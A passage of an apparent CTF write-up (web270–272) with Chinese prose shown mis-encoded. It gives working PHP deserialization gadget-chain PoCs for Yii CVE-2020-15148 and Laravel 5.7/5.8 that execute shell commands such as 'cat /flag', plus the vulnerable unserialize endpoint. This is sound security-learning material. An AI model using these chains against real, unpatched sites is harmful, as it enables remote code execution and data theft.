data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616419493789-61249473-3d01-4840-a0ca-26b48fc4139b.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616419502510-bc504266-0cb1-4d11-a324-489fbe30014e.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616419502510-bc504266-0cb1-4d11-a324-489fbe30014e.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web270-Yii-æ¡†æ¶-CVE-è¡¥ä¸ç»•è¿‡-3"><a href="#web270-Yii-æ¡†æ¶-CVE-è¡¥ä¸ç»•è¿‡-3" class="headerlink" title="web270 Yii æ¡†æ¶ CVE è¡¥ä¸ç»•è¿‡ 3"></a>web270 Yii æ¡†æ¶ CVE è¡¥ä¸ç»•è¿‡ 3</h2><span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span> <span class='btn'><a class="button"  title='æ¡†æ¶å®¡è®¡'><i class='fas fa-tag'></i>æ¡†æ¶å®¡è®¡</a></span> <span class='btn'><a class="button"  title='CVE-2020-15148'><i class='fas fa-tag'></i>CVE-2020-15148</a></span> <span class='btn'><a class="button"  title='Yiiç™»å½•å‰'><i class='fas fa-tag'></i>Yiiç™»å½•å‰</a></span> <span class='btn'><a class="button"  title='è¡¥ä¸ç»•è¿‡'><i class='fas fa-tag'></i>è¡¥ä¸ç»•è¿‡</a></span><p>æ€è·¯ç±»ä¼¼ web267ï¼Œä¼°è®¡æ˜¯æ‰“è¿‡è¡¥ä¸ç‰ˆæœ¬</p><p>æœ‰ç©ºä¼šï¼ˆå’•å’•é¢„è®¢â€¦ï¼‰é¢å¤–å†™æ–‡ç« å¤ç° ï¼ˆ</p><p>poc3</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">web</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\IndexAction(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">base</span>\<span class="title">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\DbSession(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $exp = new \yii\db\BatchQueryResult(&#x27;exec&#x27;, &#x27;cp /fla* tari.txt&#x27;);</span><br><span class="line">    <span class="keyword">echo</span>(base64_encode(serialize(<span class="variable">$exp</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616420125301-90d07246-ece9-404a-9b93-f02ffe447e39.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616420125301-90d07246-ece9-404a-9b93-f02ffe447e39.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616420139173-9f91c03f-cc54-4861-95c7-9cecfd86da3c.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616420139173-9f91c03f-cc54-4861-95c7-9cecfd86da3c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web271-Laravel-5-7-æ¡†æ¶-CVE"><a href="#web271-Laravel-5-7-æ¡†æ¶-CVE" class="headerlink" title="web271 Laravel 5.7 æ¡†æ¶ CVE"></a>web271 Laravel 5.7 æ¡†æ¶ CVE</h2><span class='btn'><a class="button"  title='PHP/7.1.26'><i class='fas fa-tag'></i>PHP/7.1.26</a></span> <span class='btn'><a class="button"  title='æ¡†æ¶å®¡è®¡'><i class='fas fa-tag'></i>æ¡†æ¶å®¡è®¡</a></span> <span class='btn'><a class="button"  title='CVE-2019-9081'><i class='fas fa-tag'></i>CVE-2019-9081</a></span> <span class='btn'><a class="button"  title='Laravel 5.7ç™»å½•å‰'><i class='fas fa-tag'></i>Laravel 5.7ç™»å½•å‰</a></span><p><a href="https://github.com/laravel/laravel/tree/5.7">æºç </a></p><p><a href="https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/">å¯å‚è€ƒæ–‡ç« </a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Laravel - A PHP Framework For Web Artisans</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span>  Laravel</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>   Taylor Otwell &lt;taylor<span class="doctag">@laravel</span>.com&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;LARAVEL_START&#x27;</span>, microtime(<span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Register The Auto Loader</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Composer provides a convenient, automatically generated class loader for</span></span><br><span class="line"><span class="comment">| our application. We just need to utilize it! We&#x27;ll simply require it</span></span><br><span class="line"><span class="comment">| into the script here so that we don&#x27;t have to worry about manual</span></span><br><span class="line"><span class="comment">| loading any of our classes later on. It feels great to relax.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Turn On The Lights</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| We need to illuminate PHP development, so let us turn on the lights.</span></span><br><span class="line"><span class="comment">| This bootstraps the framework and gets it ready for use, then it</span></span><br><span class="line"><span class="comment">| will load up this application so that we can run it and send</span></span><br><span class="line"><span class="comment">| the responses back to the browser and delight our users.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$app</span> = <span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../bootstrap/app.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Run The Application</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Once we have the application, we can handle the incoming request</span></span><br><span class="line"><span class="comment">| through the kernel, and send the associated response back to</span></span><br><span class="line"><span class="comment">| the client&#x27;s browser allowing them to enjoy the creative</span></span><br><span class="line"><span class="comment">| and wonderful application we have prepared for them.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$kernel</span> = <span class="variable">$app</span>-&gt;make(Illuminate\Contracts\Http\Kernel::class);</span><br><span class="line"><span class="variable">$response</span> = <span class="variable">$kernel</span>-&gt;handle(</span><br><span class="line">    <span class="variable">$request</span> = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br><span class="line">@unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$kernel</span>-&gt;terminate(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test</span>, <span class="variable">$app</span>, <span class="variable">$command</span>, <span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = <span class="variable">$test</span>;                 <span class="comment">//ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\Auth\GenericUser</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = <span class="variable">$app</span>;                   <span class="comment">//ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\Foundation\Application</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = <span class="variable">$command</span>;           <span class="comment">//è¦æ‰§è¡Œçš„phpå‡½æ•° system</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;     <span class="comment">//è¦æ‰§è¡Œçš„phpå‡½æ•°çš„å‚æ•°  array(&#x27;id&#x27;)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">instances</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$instances</span> = []</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;instances[<span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span>] = <span class="variable">$instances</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">defaultgenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>(<span class="title">array</span>(&quot;<span class="title">hello</span>&quot; =&gt; &quot;<span class="title">world</span>&quot;));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$app</span> = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$application</span> = <span class="keyword">new</span> Illuminate\Foundation\Application(<span class="variable">$app</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pendingcommand</span> = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(<span class="variable">$defaultgenerator</span>, <span class="variable">$application</span>, <span class="string">&#x27;system&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;cat /flag&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$pendingcommand</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä»£ç é‡Œæ˜¯é€šè¿‡ POST çš„ <code>data</code> æ¥æ”¶ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯ç”¨ <code>data</code> POST è¿‡å»</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617621477463-56ff7b49-bb5a-4f57-9c95-afee8c7661e5.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617621477463-56ff7b49-bb5a-4f57-9c95-afee8c7661e5.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web272-Laravel-5-8-æ¡†æ¶-CVE"><a href="#web272-Laravel-5-8-æ¡†æ¶-CVE" class="headerlink" title="web272 Laravel 5.8 æ¡†æ¶ CVE"></a>web272 Laravel 5.8 æ¡†æ¶ CVE</h2><span class='btn'><a class="button"  title='PHP/7.1.26'><i class='fas fa-tag'></i>PHP/7.1.26</a></span> <span class='btn'><a class="button"  title='æ¡†æ¶å®¡è®¡'><i class='fas fa-tag'></i>æ¡†æ¶å®¡è®¡</a></span> <span class='btn'><a class="button"  title='Laravel 5.8ç™»å½•å‰'><i class='fas fa-tag'></i>Laravel 5.8ç™»å½•å‰</a></span><p><a href="https://xz.aliyun.com/t/5911">å¯å‚è€ƒæ–‡ç« </a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Laravel - A PHP Framework For Web Artisans</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span>  Laravel</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>   Taylor Otwell &lt;taylor<span class="doctag">@laravel</span>.com&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;LARAVEL_START&#x27;</span>, microtime(<span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Register The Auto Loader</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Composer provides a convenient, automatically generated class loader for</span></span><br><span class="line"><span class="comment">| our application. We just need to utilize it! We&#x27;ll simply require it</span></span><br><span class="line"><span class="comment">| into the script here so that we don&#x27;t have to worry about manual</span></span><br><span class="line"><span class="comment">| loading any of our classes later on. It feels great to relax.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Turn On The Lights</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| We need to illuminate PHP development, so let us turn on the lights.</span></span><br><span class="line"><span class="comment">| This bootstraps the framework and gets it ready for use, then it</span></span><br><span class="line"><span class="comment">| will load up this application so that we can run it and send</span></span><br><span class="line"><span class="comment">| the responses back to the browser and delight our users.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$app</span> = <span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../bootstrap/app.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Run The Application</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Once we have the application, we can handle the incoming request</span></span><br><span class="line"><span class="comment">| through the kernel, and send the associated response back to</span></span><br><span class="line"><span class="comment">| the client&#x27;s browser allowing them to enjoy the creative</span></span><br><span class="line"><span class="comment">| and wonderful application we have prepared for them.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$kernel</span> = <span class="variable">$app</span>-&gt;make(Illuminate\Contracts\Http\Kernel::class);</span><br><span class="line"><span class="variable">$response</span> = <span class="variable">$kernel</span>-&gt;handle(</span><br><span class="line">    <span class="variable">$request</span> = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br><span class="line">@unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$kernel</span>-&gt;terminate(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br></pre></td></tr></table></figure><p>æœ‰ç©ºä¼šï¼ˆå’•å’•é¢„è®¢â€¦ï¼‰é¢å¤–å†™æ–‡ç« å¤ç° ï¼ˆ</p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PhpParser</span>\<span class="title">Node</span>\<span class="title">Scalar</span>\<span class="title">MagicConst</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Line</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>, <span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">EvalLoader</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span 